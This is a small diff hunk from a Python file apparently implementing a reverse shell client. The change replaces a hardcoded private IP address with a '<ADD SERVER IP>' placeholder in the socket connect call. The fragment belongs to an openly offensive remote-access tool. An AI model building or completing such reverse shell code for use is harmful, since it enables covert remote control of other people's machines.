@@ -5,7 +5,7 @@ s=socket.socket()
 class reverse_shell_client:
     def __init__(self):
         try:
-            s.connect(('192.168.1.18', 40029))
+            s.connect(('<ADD SERVER IP>', 40029))
         except:
             print("reconnecting!!")
 
